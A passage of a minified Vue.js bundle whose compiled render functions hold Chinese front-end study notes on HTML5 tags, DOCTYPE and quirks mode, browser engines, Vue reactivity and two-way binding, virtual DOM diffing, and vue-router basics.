olor:"rgb(0,0,0)"}})]),t("p",{staticStyle:{background:"rgb(245,242,240)"}},[t("span",{staticStyle:{color:"rgb(0,119,170)"}},[n._v("function")]),t("span",{staticStyle:{color:"rgb(0,0,0)"}}),t("span",{staticStyle:{color:"rgb(17,17,17)"}},[n._v("f")]),t("span",{staticStyle:{color:"rgb(153,153,153)"}},[n._v("(")]),t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v("x")]),t("span",{staticStyle:{color:"rgb(153,153,153)"}},[n._v("){")]),t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v("console")]),t("span",{staticStyle:{color:"rgb(153,153,153)"}},[n._v(".")]),t("span",{staticStyle:{color:"rgb(17,17,17)"}},[n._v("log")]),t("span",{staticStyle:{color:"rgb(153,153,153)"}},[n._v("(")]),t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v("x")]),t("span",{staticStyle:{color:"rgb(153,153,153)"}},[n._v(")}")])]),t("p",{staticStyle:{background:"rgb(245,242,240)"}},[t("span",{staticStyle:{color:"rgb(17,17,17)"}},[n._v("f")]),t("span",{staticStyle:{color:"rgb(153,153,153)"}},[n._v("()")]),t("span",{staticStyle:{color:"rgb(112,128,144)"}})]),t("p",{staticStyle:{background:"rgb(245,242,240)"}},[t("span",{staticStyle:{color:"rgb(0,0,0)"}})]),t("p",{staticStyle:{background:"rgb(245,242,240)"}},[t("span",{staticStyle:{color:"rgb(0,119,170)"}},[n._v("var")]),t("span",{staticStyle:{color:"rgb(0,0,0)"}}),t("span",{staticStyle:{color:"rgb(166,127,89)"}},[n._v("=")]),t("span",{staticStyle:{color:"rgb(0,0,0)"}}),t("span",{staticStyle:{color:"rgb(0,119,170)"}},[n._v("new")]),t("span",{staticStyle:{color:"rgb(0,0,0)"}}),t("span",{staticStyle:{color:"rgb(17,17,17)"}},[n._v("Object")]),t("span",{staticStyle:{color:"rgb(153,153,153)"}},[n._v("();")])]),t("p",{staticStyle:{background:"rgb(245,242,240)"}},[t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v("o")]),t("span",{staticStyle:{color:"rgb(153,153,153)"}},[n._v(".")]),t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v("p")]),t("span",{staticStyle:{color:"rgb(112,128,144)"}})]),t("p",{staticStyle:{background:"rgb(245,242,240)"}},[t("span",{staticStyle:{color:"rgb(0,0,0)"}})]),t("p",{staticStyle:{background:"rgb(245,242,240)"}},[t("span",{staticStyle:{color:"rgb(0,119,170)"}},[n._v("var")]),t("span",{staticStyle:{color:"rgb(0,0,0)"}}),t("span",{staticStyle:{color:"rgb(166,127,89)"}},[n._v("=")]),t("span",{staticStyle:{color:"rgb(0,0,0)"}}),t("span",{staticStyle:{color:"rgb(17,17,17)"}},[n._v("f")]),t("span",{staticStyle:{color:"rgb(153,153,153)"}},[n._v("();")])]),t("p",{staticStyle:{background:"rgb(245,242,240)"}},[t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v("x")]),t("span",{staticStyle:{color:"rgb(112,128,144)"}})]),t("p",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}})]),t("p",[t("strong",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}},[n._v("89、")]),t("span",{staticStyle:{background:"rgb(204,255,255)"}},[n._v("HTML")])]),t("span",{staticStyle:{background:"rgb(204,255,255)"}},[n._v("HTML元素标记的内容。")])]),t("p",[t("strong",[n._v("<header></header>")]),t("span",{staticStyle:{background:"rgb(204,255,255)"}})]),t("p",[t("strong",[n._v("<nav></nav>")]),t("span",{staticStyle:{background:"rgb(204,255,255)"}})]),t("p",[t("strong",[n._v("<section></section>")]),t("span",{staticStyle:{background:"rgb(204,255,255)"}})]),t("p",[t("strong",[n._v("<footer></footer>")]),t("span",{staticStyle:{background:"rgb(204,255,255)"}},[n._v("body时，才是整个页面的页脚。")])]),t("h4",{staticStyle:{background:"rgb(255,255,255)"}},[t("strong",[t("span",{staticStyle:{background:"rgb(204,255,255)"}},[n._v("90、")])]),t("a",{attrs:{href:"http://www.cnblogs.com/sunhe/p/4994058.html",rel:"nofollow"}},[t("u",[t("span",{staticStyle:{color:"rgb(33,117,155)"}},[n._v("Doctype作用，标准模式与兼容模式的区别")])])])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v("<!DOCTYPE>声明位于位于HTML文档中的第一行，处于 <html>\n        标签之前。告知浏览器的解析器用什么文档标准解析这个文档。")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v("标")]),t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v("\n        JS运作模式都是以该浏览器支持的最高标准运行。")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"}},[t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v(",模拟老式浏览器的行为以防止站点无法工作。")])]),t("p",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}})]),t("p",{attrs:{align:"justify"}},[t("strong",[t("span",{staticStyle:{color:"rgb(0,0,0)"}},[n._v("91、各种浏览器内核")])])]),t("p",{attrs:{align:"justify"}},[t("strong",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}},[n._v("Trident")])]),t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}},[n._v("Internet\n        Explorer，又称其为IE内核。（IE、傲游、世界之窗浏览器、腾讯TT）")])]),t("p",{attrs:{align:"justify"}},[t("strong",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}},[n._v("Gecko")])]),t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}},[n._v("Firefox")])]),t("p",{attrs:{align:"justify"}},[t("strong",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}},[n._v("WebKit")])]),t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}},[n._v("Safari、Chrome")])]),t("p",{attrs:{align:"justify"}},[t("strong",[t("span",{staticStyle:{color:"rgb(51,51,51)",background:"rgb(255,255,255)"}},[n._v("Presto")])]),t("span",{staticStyle:{color:"rgb(51,51,51)",background:"rgb(255,255,255)"}},[n._v("OperaPresto")])]),t("p",[t("span",{staticStyle:{color:"rgb(51,51,51)",background:"rgb(255,255,255)"}})]),t("p",[t("strong",[t("span",{staticStyle:{color:"rgb(68,68,68)",background:"rgb(255,255,255)"}},[n._v("92")]),t("span",{staticStyle:{color:"rgb(68,68,68)",background:"rgb(255,255,255)"}})])]),t("p",[t("span",{staticStyle:{color:"rgb(68,68,68)",background:"rgb(255,255,255)"}}),t("span",{staticStyle:{color:"rgb(68,68,68)",background:"rgb(255,255,255)"}}),t("span",{staticStyle:{color:"rgb(68,68,68)",background:"rgb(255,255,255)"}}),t("span",{staticStyle:{color:"rgb(68,68,68)",background:"rgb(255,255,255)"}},[t("br")]),t("span",{staticStyle:{color:"rgb(68,68,68)",background:"rgb(255,255,255)"}})]),t("p",[t("span",{staticStyle:{color:"rgb(68,68,68)",background:"rgb(255,255,255)"}}),t("span",{staticStyle:{color:"rgb(68,68,68)",background:"rgb(255,255,255)"}}),t("span",{staticStyle:{color:"rgb(68,68,68)",background:"rgb(255,255,255)"}}),t("span",{staticStyle:{color:"rgb(68,68,68)",background:"rgb(255,255,255)"}},[t("br")]),t("span",{staticStyle:{color:"rgb(68,68,68)",background:"rgb(255,255,255)"}})]),t("p",[t("span",{staticStyle:{color:"rgb(68,68,68)",background:"rgb(255,255,255)"}})]),t("p",[t("span",{staticStyle:{color:"rgb(68,68,68)",background:"rgb(255,255,255)"}},[n._v("a. ")]),t("span",{staticStyle:{color:"rgb(68,68,68)",background:"rgb(255,255,255)"}})]),t("p",[t("span",{staticStyle:{color:"rgb(68,68,68)",background:"rgb(255,255,255)"}},[n._v("b. ")]),t("span",{staticStyle:{color:"rgb(68,68,68)",background:"rgb(255,255,255)"}})]),t("p",[t("span",{staticStyle:{color:"rgb(68,68,68)",background:"rgb(255,255,255)"}},[n._v("c. ")]),t("span",{staticStyle:{color:"rgb(68,68,68)",background:"rgb(255,255,255)"}})]),t("p",[t("span",{staticStyle:{color:"rgb(0,0,0)"}})]),t("p",[t("strong",[n._v("93、attr()和prop()的区别")])]),t("p",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}})]),t("p",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}})]),t("p",[t("strong",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}},[n._v("94、")]),t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(253,252,248)"}},[n._v("data-*")]),t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(253,252,248)"}})])]),t("p",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}},[n._v("H")]),t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(255,255,255)"}},[n._v("tml5的自定义属性，")]),t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(253,252,248)"}})]),t("p",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(253,252,248)"}},[n._v("\n        JavaScript 中利用，以创建更好的用户体验")])]),t("p",[t("span",{staticStyle:{color:"rgb(0,0,0)",background:"rgb(253,252,248)"}})]),t("p",{staticStyle:{background:"rgb(255,255,255)"},attrs:{align:"justify"}},[t("strong",[t("span",{staticStyle:{color:"rgb(88,88,88)",background:"rgb(253,252,248)"}},[n._v("95、")]),t("span",{staticStyle:{color:"rgb(51,51,51)"}},[n._v("Quirks(怪癖）模式是什么？它和Standards（标准）模式有什么区别")])]),t("span",{staticStyle:{color:"rgb(88,88,88)"}},[n._v("区别：")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"},attrs:{align:"justify"}},[t("span",{staticStyle:{color:"rgb(88,88,88)"}},[n._v("总体会有布局、样式解析和脚本执行三个方面的区别。")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"},attrs:{align:"justify"}},[t("span",{staticStyle:{color:"rgb(88,88,88)"}})]),t("p",{staticStyle:{background:"rgb(255,255,255)"},attrs:{align:"justify"}},[t("span",{staticStyle:{color:"rgb(88,88,88)"}})]),t("p",{staticStyle:{background:"rgb(255,255,255)"},attrs:{align:"justify"}},[t("span",{staticStyle:{color:"rgb(88,88,88)"}},[n._v("Standards模式下，给<span>等行内元素设置wdith和height都不会生效，而在quirks模式下，则会生效。")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"},attrs:{align:"justify"}},[t("span",{staticStyle:{color:"rgb(88,88,88)"}},[n._v("standards模式下，一个元素的高度是由其包含的内容来决定的，如果父元素没有设置百分比的高度，子元素设置一个百分比的高度是无效的")])]),t("p",{staticStyle:{background:"rgb(255,255,255)"},attrs:{align:"justify"}},[t("span",{staticStyle:{color:"rgb(88,88,88)"}})])])])}],Ge={},Ve=Ge,Qe=Object(u["a"])(Ve,We,$e,!1,null,"fe2c7aa4",null),Ke=Qe.exports,Xe=function(){var n=this,r=n.$createElement;n._self._c;return n._m(0)},Ye=[function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("h2",[n._v("【Vue】双向数据绑定原理")]),t("h3",[n._v("单向绑定与双向绑定")]),t("ul",[t("li",[n._v("单向绑定非常简单，就是把Model绑定到View，当我们用JavaScript代码更新Model时，View就会自动更新。")]),t("li",[n._v("如果用户更新了View，Model的数据也自动被更新了，这种情况就是双向绑定")])]),t("h3",[n._v("几种实现双向绑定的做法")]),t("ul",[t("li",[t("p",[n._v("发布者-订阅者模式（backbone.js）")])]),t("li",[t("p",[n._v("脏值检查（angular.js）")]),t("ul",[t("li",[t("p",[n._v("通过脏值检测的方式比对数据是否有变更，来决定是否更新视图，最简单的方式就是通过 setInterval() 定时轮询检测数据变动，当然Google不会这么low，angular只有在指定的事件触发时进入脏值检测，大致如下")]),t("ul",[t("li",[n._v("DOM事件，譬如用户输入文本，点击按钮等。( ng-click )")]),t("li",[n._v("XHR响应事件 ( $http )")]),t("li",[n._v("浏览器Location变更事件 ( $location )")]),t("li",[n._v("Timer事件( $timeout , $interval )")]),t("li",[n._v("执行 $digest() 或 $apply()")])])])])]),t("li",[t("p",[n._v("数据劫持（vue.js）")]),t("ul",[t("li",[n._v("vue.js 则是采用数据劫持结合发布者-订阅者模式的方式，通过Object.defineProperty()来劫持各个属性的setter，getter，在数据变动时发布消息给订阅者，触发相应的监听回调。")])])])]),t("h3",[n._v("Vue双向数据绑定实现思路")]),t("ul",[t("li",[t("p",[n._v("1、实现一个数据监听器Observer，能够对数据对象的所有属性进行监听，如有变动可拿到最新值并通知订阅者 ")])]),t("li",[t("p",[n._v("2、实现一个指令解析器Compile，对每个元素节点的指令进行扫描和解析，根据指令模板替换数据，以及绑定相应的更新函数 ")])]),t("li",[t("p",[n._v("3、实现一个Watcher，作为连接Observer和Compile的桥梁，能够订阅并收到每个属性变动的通知，执行指令绑定的相应回调函数，从而更新视图 ")])]),t("li",[t("p",[n._v("4、mvvm入口函数，整合以上三者")])]),t("li",[t("p",[n._v("另一种解释")]),t("ul",[t("li",[n._v("首先，需要利用Object.defineProperty，将要观察的对象，转化成getter/setter，以便拦截对象赋值与取值操作，称之为Observer；")]),t("li",[n._v("需要将DOM解析，提取其中的指令与占位符，并赋与不同的操作，称之为Compiler；")]),t("li",[n._v("需要将Compile的解析结果，与Observer所观察的对象连接起来，建立关系，在Observer观察到对象数据变化时，接收通知，同时更新DOM，称之为Watcher；")]),t("li",[n._v("最后，需要一个公共入口对象，接收配置，协调上述三者，称为Vue;")])])]),t("li",[t("p",[n._v("条件")]),t("ul",[t("li",[n._v("把一个普通对象传给 Vue 实例作为它的 data 选项，Vue.js 将遍历它的属性，用 Object.defineProperty 将它们转为 getter/setter。这是 ES5 特性，不能打补丁实现，这便是为什么 Vue.js 不支持 IE8 及更低版本。")])])])]),t("h3",[n._v("具体实现")]),t("ul",[t("li",[t("p",[n._v("（1）实现Observer")]),t("p",[n._v("利用Obeject.defineProperty()来监听属性变动 那么将需要observe的数据对象进行递归遍历，包括子属性对象的属性，都加上\tsetter和getter 这样的话，给这个对象的某个值赋值，就会触发setter，那么就能监听到了数据变化。")]),t("ul",[t("li",[n._v("（1）将需要observe的数据对象进行递归遍历，包括子属性对象的属性，都加上 setter和getter，这样的话，给这个对象的某个值赋值，就会触发setter，那么就能监听到了数据变化。")]),t("li",[n._v("（2）监听到变化之后就是怎么通知订阅者了，所以接下来我们需要实现一个消息订阅器，很简单，维护一个数组，用来收集订阅者，数据变动触发notify，再调用订阅者的update方法，")]),t("li",[n._v("（3）那么问题来了，谁是订阅者？怎么往订阅器添加订阅者？ 没错，上面的思路整理中我们已经明确订阅者应该是Watcher, 而且var dep = new Dep();是在 defineReactive方法内部定义的，所以想通过dep添加订阅者，就必须要在闭包内操作，所以我们可以在getter里面动手脚")])])]),t("li",[t("p",[n._v("（2）实现Compile")]),t("p",[n._v("compile主要做的事情是解析模板指令，将模板中的变量替换成数据，然后初始化渲染页面视图，并将每个指令对应的节点绑定更新函数，添加监听数据的订阅者，一旦数据有变动，收到通知，更新视图，")]),t("p",[n._v(" ")]),t("ul",[t("li",[t("p",[n._v("思路")]),t("ul",[t("li",[n._v("compile主要做的事情是解析模板指令，将模板中的变量替换成数据，然后初始化渲染页面视图，并将每个指令对应的节点绑定更新函数，添加监听数据的订阅者，一旦数据有变动，收到通知，更新视图，")])])]),t("li",[t("p",[n._v("（1）因为遍历解析的过程有多次操作dom节点，为提高性能和效率，会先将跟节点el转换成文档碎片fragment进行解析编译操作，解析完成，再将fragment添加回原来的真实dom节点中")])]),t("li",[t("p",[n._v("（2）compileElement方法将遍历所有节点及其子节点，进行扫描解析编译，调用对应的指令渲染函数进行数据渲染，并调用对应的指令更新函数进行绑定")])]),t("li",[t("p",[n._v('这里通过递归遍历保证了每个节点及子节点都会解析编译到，包括了{{}}表达式声明的文本节点。指令的声明规定是通过特定前缀的节点属性来标记，如<span v-text="content" other-attr中v-text便是指令，而other-attr不是指令，只是普通的属性。 监听数据、绑定更新函数的处理是在compileUtil.bind()这个方法中，通过new Watcher()添加回调来接收数据变化的通知')])])])]),t("li",[t("p",[n._v("（3）实现Watcher")]),t("ul",[t("li",[t("p",[n._v("Watcher订阅者作为Observer和Compile之间通信的桥梁，主要做的事情是")]),t("ul",[t("li",[n._v("1、在自身实例化时往属性订阅器(dep)里面添加自己 ")]),t("li",[n._v("2、自身必须有一个update()方法 ")]),t("li",[n._v("3、待属性变动dep.notify()通知时，能调用自身的update()方法，并触发Compile中绑定的回调，则功成身退。 ")])])]),t("li",[t("p",[n._v("实例化Watcher的时候，调用get()方法，通过Dep.target = watcherInstance标记订阅者是当前watcher实例，强行触发属性定义的getter方法，getter方法执行的时候，就会在属性的订阅器dep添加当前watcher实例，从而在属性值有变化的时候，watcherInstance就能收到更新通知。")])])])]),t("li",[t("p",[n._v("（4）实现MVVM")]),t("ul",[t("li",[n._v("MVVM作为数据绑定的入口，整合Observer、Compile和Watcher三者，通过Observer来监听自己的model数据变化，通过Compile来解析编译模板指令，最终利用Watcher搭起Observer和Compile之间的通信桥梁，达到数据变化 -> 视图更新；视图交互变化(input) -> 数据model变更的双向绑定效果。")]),t("li",[n._v("一个简单的MVVM构造器是这样子")])])])]),t("h3",[n._v("用Object.defineProperty()简易实现一个双向绑定")])])}],Ze={},na=Ze,ra=Object(u["a"])(na,Xe,Ye,!1,null,"8b8b7768",null),ta=ra.exports,ea=function(){var n=this,r=n.$createElement;n._self._c;return n._m(0)},aa=[function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("h2",[n._v("【Vue监听缺陷】Vue数组下标以及增删对象属性无法响应式")]),t("h3",[n._v("对于数组的监听")]),t("ul",[t("li",[t("p",[n._v("首先，Vue.js是基于Object.defineProperty对对象实现“响应式化”，而对于数组，Vue.js提供的方法是重写push、pop、shift、unshift、splice、sort、reverse这七个数组方法。")]),t("ul",[t("li",[n._v("直接重写数组")]),t("li",[n._v("def的作用就是重新定义对象属性的value值")]),t("li",[n._v("理解版，即在使用原生数组方法结果之后，发布改变与观察新增的元素，再返回值")]),t("li",[n._v("理解版中的dosomething在源码中的代码")])])]),t("li",[t("p",[n._v("Vue 不能检测以下变动的数组")]),t("ul",[t("li",[t("p",[n._v("（1）当你利用索引直接设置一个项时，例如：vm.items[indexOfItem] = newValue，")])]),t("li",[t("p",[n._v("（2）当你修改数组的长度时，例如：vm.items.length = newLength")])]),t("li",[t("p",[n._v("解释")]),t("ul",[t("li",[n._v("Vue不能检测到对象的添加或者删除。然而Vue在初始化实例时就对属性执行了setter/getter转化过程，所以属性必须开始就在对象上，这样才能让Vue转化它。 ")]),t("li",[n._v("数组中index都可以看做是属性，当我们添加属性并赋值时，Vue并不能检测到对象中属性的添加或者删除，但是其的确是添加或删除了，故我们可以通过console看到变化，所以就没有办法做到响应式；")])])])])]),t("li",[t("p",[n._v("解决")]),t("ul",[t("li",[n._v("数组索引设置")]),t("li",[n._v("修改数组长度")])])])]),t("h3",[n._v("Vue 不能检测对象属性的添加或删除")]),t("ul",[t("li",[t("p",[n._v("现象")]),t("ul",[t("li",[n._v("对于已经创建的实例，Vue 不能动态添加根级别的响应式属性。")])])]),t("li",[t("p",[n._v("解决")]),t("ul",[t("li",[t("p",[n._v("为已有对象赋予单个新属性")]),t("ul",[t("li",[n._v("可以使用 Vue.set(object, key, value) 方法向嵌套对象添加响应式属性。")])])]),t("li",[t("p",[n._v("为已有对象赋予多个新属性")]),t("ul",[t("li",[n._v("用两个对象的属性创建一个新的对象")])])])])])]),t("h3",[n._v("Vue.set()原理")]),t("ul",[t("li",[t("p",[n._v("作用")]),t("ul",[t("li",[n._v("Vue.set()向响应式对象中添加一个属性，并确保这个新属性同样是响应式的，且触发视图更新。它必须用于向响应式对象上添加新属性，因为 Vue 无法探测普通的新增属性 (比如 this.myObject.newProperty = 'hi')")])])]),t("li",[t("p",[n._v("实现原理")]),t("ul",[t("li",[t("p",[n._v("Vue.set()和this.$set()这两个api的实现原理基本一模一样，都是使用了set函数。set函数是从 ../observer/index 文件中导出的，区别在于Vue.set()是将set函数绑定在Vue构造函数上，this.$set()是将set函数绑定在Vue原型上。")])]),t("li",[t("p",[n._v("关键代码分析")]),t("ul",[t("li",[t("p",[n._v("数组的实现原理")]),t("ul",[t("li",[t("p",[n._v("Vue中的数组与普通的JS数组")]),t("ul",[t("li",[t("p",[n._v("Vue")])]),t("li",[t("p",[n._v("普通")])]),t("li",[t("p",[n._v("区别")]),t("ul",[t("li",[n._v("普通JS中数组的原型是指向Array.prototype，也就是说 arrJs."),t("strong",[n._v("proto")]),n._v(" == Array.prototype。")]),t("li",[n._v("Vue中数组的原型指向的一个对象，这个对象上面只有7个push、pop等方法，并且这个对象上的原型才是指向的Array.prototype。所以我们在vue中调用数组的push、pop等方法时其实不是直接调用的数组原型给我们提供的push、pop等方法，而是调用的arrayMethods给我们提供的push、pop等方法。这里你可以理解成vue在arrayMethods对象中做过了特殊处理，如果你调用了arrayMethods提供的push、pop等7个方法，那么它会触发当前收集的依赖（这里收集的依赖可以暂时理解成渲染函数），导致页面重新渲染。")])])])])]),t("li",[t("p",[n._v("实现原理")]),t("ul",[t("li",[n._v("其实Vue.set()对于数组的处理其实就是调用了splice方法……我倒")])])])])]),t("li",[t("p",[n._v("对象的实现原理")]),t("ul",[t("li",[n._v("defineReactive(ob.value, key, val)的意思是给新加的属性添加依赖，以后再直接修改这个新的属性的时候就会触发页面渲染。")]),t("li",[n._v("ob.dep.notify()这句代码的意思是触发当前的依赖（这里的依赖依然可以理解成渲染函数），所以页面就会进行重新渲染。")])])])])])])])])])}],ia={},sa=ia,oa=Object(u["a"])(sa,ea,aa,!1,null,"a55f2256",null),la=oa.exports,ca=function(){var n=this,r=n.$createElement;n._self._c;return n._m(0)},pa=[function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("h2",[n._v("【Vue】对于Virtual Dom的理解")]),t("h3",[n._v("虚拟DOM与真实DOM的区别")]),t("ul",[t("li",[t("p",[n._v("1.虚拟DOM不会进行排版与重绘操作")])]),t("li",[t("p",[n._v("2.虚拟DOM进行频繁修改，然后一次性比较并修改真实DOM中需要改的部分（注意！），最后并在真实DOM中进行排版与重绘，减少过多DOM节点排版与重绘损耗")])]),t("li",[t("p",[n._v("3.真实DOM频繁排版与重绘的效率是相当低的")])]),t("li",[t("p",[n._v("4.虚拟DOM有效降低大面积（真实DOM节点）的重绘与排版，因为最终与真实DOM比较差异，可以只渲染局部（同2）")])]),t("li",[t("p",[n._v("损耗计算")]),t("ul",[t("li",[t("p",[n._v("使用虚拟DOM的损耗计算：")]),t("ul",[t("li",[n._v("总损耗 = 虚拟DOM增删改 + （与Diff算法效率有关）真实DOM差异增删改 + （较少的节点）排版与重绘")])])]),t("li",[t("p",[n._v("直接使用真实DOM的损耗计算：")]),t("ul",[t("li",[n._v("总损耗 = 真实DOM完全增删改 + （可能较多的节点）排版与重绘")])])])])]),t("li",[t("p",[n._v("总之，一切为了减弱频繁的大面积重绘引发的性能问题，不同框架不一定需要虚拟DOM，关键看框架是否频繁会引发大面积的DOM操作")])])]),t("h3",[n._v("Virtual DOM算法")]),t("ul",[t("li",[t("p",[n._v("初步了解")]),t("ul",[t("li",[t("p",[n._v("（1）真实DOM是很慢的")]),t("ul",[t("li",[n._v("如果我们把一个简单的div元素的属性都打印出来，你会看到：")]),t("li",[n._v("而这仅仅是第一层。真正的 DOM 元素非常庞大，这是因为标准就是这么设计的。而且操作它们的时候你要小心翼翼，轻微的触碰可能就会导致页面重排，这可是杀死性能的罪魁祸首。")])])]),t("li",[t("p",[n._v("（2）相对于 DOM 对象，原生的 JavaScript 对象处理起来更快，而且更简单。DOM 树上的结构、属性信息我们都可以很容易地用 JavaScript 对象表示出来：")])])])]),t("li",[t("p",[n._v("Virtual DOM 算法几个步骤")]),t("ul",[t("li",[t("p",[n._v("（1）用 JavaScript 对象结构表示 DOM 树的结构；然后用这个对象树构建一个真正的 DOM 树，插到文档当中")])]),t("li",[t("p",[n._v("（2）当状态变更的时候，重新构造一棵新的对象树。然后用新的对象树和旧的对象树进行比较，记录两棵对象树差异")])]),t("li",[t("p",[n._v("（3）把2所记录的差异应用到步骤1所构建的真正的DOM树上，视图就更新了")])]),t("li",[t("p",[n._v("总结理解")]),t("ul",[t("li",[n._v("Virtual DOM 本质上就是在 JS 和 DOM 之间做了一个缓存。可以类比 CPU 和硬盘，既然硬盘这么慢，我们就在它们之间加个缓存：既然 DOM 这么慢，我们就在它们 JS 和 DOM 之间加个缓存。CPU（JS）只操作内存（Virtual DOM），最后的时候再把变更写入硬盘（DOM）。")])])])])])]),t("h3",[n._v("【diff算法】Virtual Dom以及Diff算法")]),t("ul",[t("li",[t("p",[n._v("（1）创建真实Dom的代价很大")]),t("ul",[t("li",[n._v("使用document.CreateElement 和 document.CreateTextNode创建的就是真实节点。")]),t("li",[n._v("我们可以做个试验。打印出一个空元素的第一层属性，可以看到标准让元素实现的东西太多了。如果每次都重新生成新的元素，对性能是巨大的浪费。")])])]),t("li",[t("p",[n._v("（2）Virtual Dom的解决思路")]),t("ul",[t("li",[t("p",[n._v("通俗易懂的来说就是用一个简单的对象去代替复杂的dom对象。")])]),t("li",[t("p",[n._v("举例")]),t("ul",[t("li",[n._v("我们在body里插入一个class为a的div。")]),t("li",[n._v("对于这个div我们可以用一个简单的对象mydivVirtual代表它，它存储了对应dom的一些重要参数，在改变dom之前，会先比较相应虚拟dom的数据，如果需要改变，才会将改变应用到真实dom上。")])])])])]),t("li",[t("p",[n._v("（3）为什么不直接修改Dom而需要加一层Virtual Dom呢？")]),t("ul",[t("li",[n._v("很多时候手工优化dom确实会比virtual dom效率高，对于比较简单的dom结构用手工优化没有问题，但当页面结构很庞大，结构很复杂时，手工优化会花去大量时间，而且可维护性也不高，不能保证每个人都有手工优化的能力。至此，virtual dom的解决方案应运而生，")]),t("li",[n._v("virtual dom很多时候都不是最优的操作，但它具有普适性，在效率、可维护性之间达平衡。")]),t("li",[n._v("virtual dom 另一个重大意义就是提供一个中间层，js去写ui，ios安卓之类的负责渲染，就像reactNative一样。")])])]),t("li",[t("p",[n._v("（4）分析Diff")]),t("ul",[t("li",[t("p",[n._v("Vue和React的虚拟DOM的Diff算法大致相同，其核心是基于两个简单的假设：")]),t("ul",[t("li",[t("ol",{attrs:{start:""}},[t("li",[n._v("两个相同的组件产生类似的DOM结构，不同的组件产生不同的DOM结构。")])])]),t("li",[t("ol",{attrs:{start:"2"}},[t("li",[n._v("同一层级的一组节点，他们可以通过唯一的id进行区分。")])])])])]),t("li",[t("p",[n._v("Diff算法特点：当页面的数据发生变化时，Diff算法只会比较同一层级的节点：")]),t("ul",[t("li",[n._v("1.如果节点类型不同，直接干掉前面的节点，再创建并插入新的节点，不会再比较这个节点以后的子节点了。")]),t("li",[n._v("2.如果节点类型相同，则会重新设置该节点的属性，从而实现节点的更新。")])])])])]),t("li",[t("p",[n._v("（5）传统Diff算法与Vue中的Diff算法")]),t("ul",[t("li",[t("p",[n._v("传统的Diff算法")]),t("ul",[t("li",[n._v("传统算法就是对每个节点一一对比，循环遍历所有的子节点，然后判断子节点的更新状态，分别为remove、add、change。如果before的子节点仍有子节点依旧顺次执行。")])])]),t("li",[t("p",[n._v("Vue中的Diff算法")]),t("ul",[t("li",[n._v("传统 diff 算法的复杂度为 O(n^3)，单纯从demo看，复杂度不到n3，但实际上。React 通过制定大胆的策略，将 O(n^3) 复杂度的问题转换成 O(n) 复杂度的问题。")])])])])])])])}],ua={},ma=ua,da=Object(u["a"])(ma,ca,pa,!1,null,"5571d7eb",null),ga=da.exports,ba=function(){var n=this,r=n.$createElement;n._self._c;return n._m(0)},va=[function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("h2",[n._v("vue-router")]),t("h3",[n._v("基础")]),t("ul",[t("li",[t("p",[n._v("Vue.router基础")]),t("ul",[t("li",[t("p",[n._v("开始")]),t("ul",[t("li",[t("p",[n._v("作用：创建单页应用")])]),t("li",[t("p",[n._v("例子")]),t("ul",[t("li",[n._v("实例1（简单）")]),t("li",[n._v("实例2（复杂但有说明--命名路由中的例子）")])])])])]),t("li",[t("p",[n._v("动态路由匹配")]),t("ul",[t("li",[t("p",[n._v("基本知识")]),t("ul",[t("li",[t("p",[n._v("说明")]),t("ul",[t("li",[n._v("动态路由以冒号开头；通过$route.params可以访问相对应的值")])])]),t("li",[t("p",[n._v("例子")]),t("ul",[t("li",[n._v("实例")])])])])]),t("li",[t("p",[n._v("响应路由参数的变化")]),t("ul",[t("li",[t("p",[n._v("想对路由变化（从预设的路由A切换值预设的路由B）做出反应，可采用watch")])]),t("li",[t("p",[n._v("例子")]),t("ul",[t("li",[n._v("实例")])])])])]),t("li",[t("p",[n._v("高级匹配模式")])]),t("li",[t("p",[n._v("匹配优先级")]),t("ul",[t("li",[n._v("有时一个路径会有多个路由，这时以最先定义的路由优先级最高的原则来处理")])])])])]),t("li",[t("p",[n._v("嵌套路由")]),t("ul",[t("li",[t("p",[n._v("例子")]),t("ul",[t("li",[n._v("实例")])])])])]),t("li",[t("p",[n._v("编程式导航")]),t("ul",[t("li",[n._v("router.push(location)")]),t("li",[n._v("router.replace(location)")]),t("li",[n._v("router.go(n)")])])]),t("li",[t("p",[n._v("命名路由")]),t("ul",[t("li",[t("p",[n._v("注意事项")]),t("ul",[t("li",[n._v("1、需要命名（to及routes里都要有name属性）")]),t("li",[